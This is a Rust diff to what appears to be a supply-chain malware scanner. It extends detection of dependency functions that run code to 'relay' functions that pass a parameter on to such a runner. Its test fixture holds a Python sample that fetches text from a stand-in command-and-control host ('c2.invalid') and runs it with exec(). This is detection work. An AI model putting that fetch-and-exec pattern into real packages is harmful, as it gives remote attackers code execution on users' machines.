@@ -232,6 +232,7 @@ struct Module<'t> {
     default_module: Option<PyStr>,
     env: OMap<Ret>,
     bodies: OMap<(Vec<PyStr>, Vec<PyStr>)>,
+    relays: OMap<(Vec<PyStr>, Vec<PyStr>)>,
 }
 
 impl<'t> Module<'t> {
@@ -251,6 +252,7 @@ impl<'t> Module<'t> {
             default_module: None,
             env: OMap::default(),
             bodies: OMap::default(),
+            relays: OMap::default(),
         }
     }
 }
@@ -601,10 +603,15 @@ impl<'p> Xf<'p> {
         }
     }
 
-    /// core._xf_body
+    /// core._xf_body: a body that names a code runner, else a relay
     fn body(&self, module: &mut Module, sym: PyStr, params: &[PyStr], body: &[&[u32]]) {
-        if !params.is_empty() && !module.bodies.contains(&sym) && self.in_rows(self.run_needles, body) {
+        if params.is_empty() || module.bodies.contains(&sym) {
+            return;
+        }
+        if self.in_rows(self.run_needles, body) {
             module.bodies.insert(sym, (params.to_vec(), body.iter().map(|r| r.to_vec()).collect()));
+        } else if !module.relays.contains(&sym) {
+            module.relays.insert(sym, (params.to_vec(), body.iter().map(|r| r.to_vec()).collect()));
         }
     }
 
@@ -1997,8 +2004,74 @@ impl<'t> Package<'t> {
         tainted
     }
 
-    /// The functions that run a parameter as code (core._XfPackage.runners).
+    /// The functions that run a parameter as code (core._XfPackage.runners):
+    /// those whose own body does, then those that hand a parameter to one
+    /// (a relay), up to _XF_ROUNDS hops.
     fn runners(&self, xf: &Xf) -> HashSet<Sym> {
+        let mut out = self.direct_runners(xf);
+        // (a body that names a runner may still only hand it on)
+        let mut relays: Vec<(&Module, &PyStr, Vec<PyStr>, PyStr)> = Vec::new();
+        for m in self.mods.values() {
+            for (sym, (params, body)) in m.bodies.iter().chain(m.relays.iter()) {
+                let mut names: Vec<PyStr> = params.iter().filter(|p| !Xf::in_set(xf.not_params, p)).cloned().collect();
+                names.sort();
+                names.dedup();
+                if names.is_empty() || out.contains(&(m.key.clone(), sym.clone())) {
+                    continue;
+                }
+                let refs: Vec<&[u32]> = body.iter().map(|r| r.as_slice()).collect();
+                relays.push((m, sym, names, join_rows(&refs)));
+            }
+        }
+        for _ in 0..xf.lim.rounds {
+            if out.is_empty() || relays.is_empty() {
+                break;
+            }
+            let running = self.marked_members(&out);
+            let mut seeds_of: HashMap<PyStr, Vec<PyStr>> = HashMap::new();
+            let mut grew: Vec<Sym> = Vec::new();
+            let mut read = 0usize;
+            for (m, sym, names, text) in &relays {
+                let me: Sym = (m.key.clone(), (*sym).clone());
+                if out.contains(&me) {
+                    continue;
+                }
+                if !seeds_of.contains_key(&m.key) {
+                    let mut set: BTreeSet<PyStr> = xf.seeds(self, m, &out, &[], &running).seeds.into_keys().collect();
+                    for (k, n) in &out {
+                        if k == &m.key && !n.contains(&c('.')) {
+                            set.insert(n.clone());
+                        }
+                    }
+                    seeds_of.insert(m.key.clone(), set.into_iter().collect());
+                }
+                let found: Vec<PyStr> = seeds_of[&m.key]
+                    .iter()
+                    .filter(|n| pystr::find(text, n, 0).is_some())
+                    .take(xf.lim.max_seeds)
+                    .cloned()
+                    .collect();
+                if found.is_empty() {
+                    continue;
+                }
+                read += 1;
+                if read > xf.lim.max_runners {
+                    break;
+                }
+                if let Some((_, "run")) = received::received_code_kind(xf.p, text, names, &found) {
+                    grew.push(me);
+                }
+            }
+            if grew.is_empty() {
+                break;
+            }
+            out.extend(grew);
+        }
+        out
+    }
+
+    /// The functions whose own body runs a parameter (core._XfPackage.direct_runners).
+    fn direct_runners(&self, xf: &Xf) -> HashSet<Sym> {
         let mut out = HashSet::new();
         let mut count = 0usize;
         for m in self.mods.values() {
@@ -2533,6 +2606,9 @@ pub struct File<'t> {
     pub text: &'t [u32],
     /// what the finding's message starts with ("Dependency code"; a registry scan names the file)
     pub who: PyStr,
+    /// the package a Python file is read in when not its top-level name's
+    /// (core._xf_site_groups: a distribution's top-level modules)
+    pub group: Option<PyStr>,
 }
 
 /// What became of one package.
@@ -2597,7 +2673,8 @@ impl<'p> Xf<'p> {
         for (i, f) in files.iter().enumerate() {
             if is(&f.lang, "py") {
                 if let Some((top, dotted, is_pkg)) = self.py_module(&slashed(&f.path, sep)) {
-                    push(Lang::Py, if one_package { Vec::new() } else { top }, (dotted, Extra::Pkg(is_pkg), i));
+                    let root = if one_package { Vec::new() } else { f.group.clone().unwrap_or(top) };
+                    push(Lang::Py, root, (dotted, Extra::Pkg(is_pkg), i));
                 }
             } else if is(&f.lang, "js") {
                 let path = slashed(&f.path, sep);
@@ -2789,8 +2866,8 @@ mod tests {
         let net = s("import requests\n\ndef pull():\n    return requests.get('https://c2.invalid/p').text\n");
         let run = s("from ._net import pull\nexec(pull())\n");
         let files = vec![
-            File { path: s("venv/lib/site-packages/pkg/_net.py"), lang: s("py"), text: &net, who: s("Dependency code") },
-            File { path: s("venv/lib/site-packages/pkg/__init__.py"), lang: s("py"), text: &run, who: s("Dependency code") },
+            File { path: s("venv/lib/site-packages/pkg/_net.py"), lang: s("py"), text: &net, who: s("Dependency code"), group: None },
+            File { path: s("venv/lib/site-packages/pkg/__init__.py"), lang: s("py"), text: &run, who: s("Dependency code"), group: None },
         ];
         let opts = Options { one_package: false, sep: s("/"), redact: true, neumaier: false, threads: 1, steps: crate::budget::DEFAULT_STEPS };
         let got = cross_file(&p, &files, &HashSet::new(), &opts);
